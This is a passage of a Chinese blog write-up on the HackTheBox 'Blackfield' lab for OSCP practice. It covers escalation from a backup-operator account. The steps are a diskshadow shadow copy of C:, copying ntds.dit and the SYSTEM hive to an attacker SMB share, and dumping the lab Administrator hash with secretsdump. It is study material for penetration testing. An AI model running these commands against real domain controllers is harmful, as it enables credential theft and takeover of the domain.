+<p>Diskshadow.exe 是一种公开卷影复制服务 (VSS) 提供的功能的工具。  默认情况下，Diskshadow 使用类似于 Diskraid 或 Diskpart 的交互式命令解释器。  Diskshadow 还包括一个脚本模式。 </p>
+</blockquote>
+<p>此时我们可以利用diskshadow来将c盘挂载到另一个驱动器上，这样我们就可以复制其中的内容达到提权的效果。</p>
+<p>两个脚本内容如下</p>
+<p>diskshadow.txt</p>
+<blockquote>
+<p>需要注意的是set metadata可以用于指定<code> .cab</code>文件的存储路径，我们需要使其存储在可写目录下，否则无法成功挂在到另一个驱动器上</p>
+</blockquote>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias someAlias</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">metadata c:\programdata\sol.cab</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">verbose on</span><br>create<br>expose <span class="hljs-comment">%someAlias% z:</span><br>reset<br></code></pre></td></tr></table></figure>
+
+<p>delete.txt</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">delete</span> shadows <span class="hljs-built_in">volume</span> z<br>reset<br></code></pre></td></tr></table></figure>
+
+<p>此时由于运行程序是在windows上，我们需要对文件格式进行处理</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>unix2dos diskshadow.txt<br><span class="hljs-variable">$ </span>unix2dos delete.txt<br></code></pre></td></tr></table></figure>
+
+<p>然后上传到目标主机</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; upload <span class="hljs-regexp">/home/</span>sollupus<span class="hljs-regexp">/OSCP/</span>Blackfield<span class="hljs-regexp">/exploit/</span>diskshadow.txt<br>*Evil-WinRM* PS C:\Users\svc_backup\Desktop&gt; upload <span class="hljs-regexp">/home/</span>sollupus<span class="hljs-regexp">/OSCP/</span>Blackfield<span class="hljs-regexp">/exploit/</span><span class="hljs-keyword">delete</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>然后运行脚本</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\svc_backup\Desktop&gt;</span> diskshadow /s .<span class="hljs-string">\diskshadow.txt</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509233656418.png" srcset="/img/loading.gif" lazyload class="">
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\svc_backup\Desktop&gt;</span> diskshadow /s .<span class="hljs-string">\diskshadow.txt</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509233605284.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>这样一来，我们就可以获取C盘下的所有内容了</p>
+<h3 id="Grab-ntds-dit"><a href="#Grab-ntds-dit" class="headerlink" title="Grab ntds.dit"></a>Grab ntds.dit</h3><p>先在本地开启smbserver，然后直接将ntds.dit文件传输到本地主机上</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\svc_backup\Desktop&gt;</span> copy-filesebackupprivilege z:<span class="hljs-string">\windows\ntds\ntds.dit</span> .<br>*Evil-WinRM* PS C:<span class="hljs-string">\Users\svc_backup\Desktop&gt;</span> mv .<span class="hljs-string">\ntds.dit</span> <span class="hljs-string">\\10.10.16.x\share\ntds.dit</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再将SYSTEM内容传输过来</p>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-symbol">*Evil</span>-WinRM* PS C:\Users\svc_backup\Desktop&gt; reg save hklm\<span class="hljs-keyword">system</span><br><span class="hljs-symbol">*Evil</span>-WinRM* PS C:\Users\svc_backup\Desktop&gt; mv <span class="hljs-keyword">SYSTEM</span> \\<span class="hljs-number">10.10</span><span class="hljs-number">.16</span>.x\share\<span class="hljs-keyword">SYSTEM</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>使用secretsdump工具转储hash,成功获取Administrator的hash</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>impacket-secretsdump -ntds ntds.dit -system <span class="hljs-title class_">SYSTEM</span> <span class="hljs-title class_">LOCAL</span> -o secretsdump<br><span class="hljs-variable">$ </span>cat secretsdump.ntds|grep -i administrator<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span><span class="hljs-symbol">:aad3b435b51404eeaad3b435b51404ee</span><span class="hljs-symbol">:</span><span class="hljs-number">184</span>fb5e5178480be64824d4cd53b99ee::<span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们就可以利用各种工具登录目标机器</p>
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/image-20230509234412462.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>root.txt</p>
+<img src="/2023/05/09/Road-to-OSCP-7-Blackfield/rootflag.png" srcset="/img/loading.gif" lazyload class="">
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP%E5%A4%87%E8%80%83/">#OSCP备考</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Road-to-OSCP-7-Blackfield</div>
+      <div>http://example.com/2023/05/09/Road-to-OSCP-7-Blackfield/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>So1Lupus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/07/Road-to-OSCP-6-Sauna/" title="Road-to-OSCP-6-Sauna">
+                        <span class="hidden-mobile">Road-to-OSCP-6-Sauna</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022029346号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
